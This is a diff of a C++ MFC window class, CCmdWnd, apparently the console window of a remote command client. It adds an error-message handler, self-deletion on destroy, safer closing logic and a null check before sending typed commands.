@@ -2,10 +2,11 @@
 #include "CmdWnd.h"
 #include "CmdSrv.h"
 
-CCmdWnd::CCmdWnd(CCmdSrv*pHandler)
+CCmdWnd::CCmdWnd(CCmdSrv*pHandler):
+m_DestroyAfterDisconnect(FALSE),
+m_pHandler(pHandler),
+m_LastCommand(NULL)
 {
-	m_pHandler = pHandler;
-	m_LastCommand = NULL;
 }
 
 
@@ -16,6 +17,7 @@ BEGIN_MESSAGE_MAP(CCmdWnd, CFrameWnd)
 	ON_WM_CREATE()
 	ON_WM_CLOSE()
 	ON_WM_SIZE()
+	ON_MESSAGE(WM_CMD_ERROR,OnError)
 	ON_MESSAGE(WM_CMD_RESULT,OnCmdResult)
 END_MESSAGE_MAP()
 
@@ -61,12 +63,30 @@ int CCmdWnd::OnCreate(LPCREATESTRUCT lpCreateStruct)
 }
 
 
+LRESULT CCmdWnd::OnError(WPARAM wParam, LPARAM lParam){
+	TCHAR*szError = (TCHAR*)wParam;
+	MessageBox(szError, TEXT("Error"), MB_OK | MB_ICONINFORMATION);
+	return 0;
+}
+void CCmdWnd::PostNcDestroy()
+{
+	if (!m_DestroyAfterDisconnect){
+		delete this;
+	}
+}
+
+
+
 void CCmdWnd::OnClose()
 {
 	// TODO:  在此添加消息处理程序代码和/或调用默认值
 	if (m_pHandler){
+		m_DestroyAfterDisconnect = TRUE;
 		m_pHandler->Close();
-		m_pHandler = NULL;
+	}
+	else{
+		//m_pHandler已经没了,现在只管自己就行.
+		DestroyWindow();
 	}
 }
 
@@ -119,7 +139,8 @@ BOOL CCmdWnd::PreTranslateMessage(MSG* pMsg)
 				//发送命令
 				aCmd = (CW2A(Cmd));
 				aCmd += "\r\n";
-				m_pHandler->SendMsg(CMD_COMMAND, aCmd.GetBuffer(), aCmd.GetLength() + 1);
+				if (m_pHandler)
+					m_pHandler->SendMsg(CMD_COMMAND, aCmd.GetBuffer(), aCmd.GetLength() + 1);
 				if (Cmd.GetLength())
 				{
 					//记录一下命令.
@@ -172,3 +193,5 @@ BOOL CCmdWnd::PreTranslateMessage(MSG* pMsg)
 	}
 	return CFrameWnd::PreTranslateMessage(pMsg);
 }
+
+
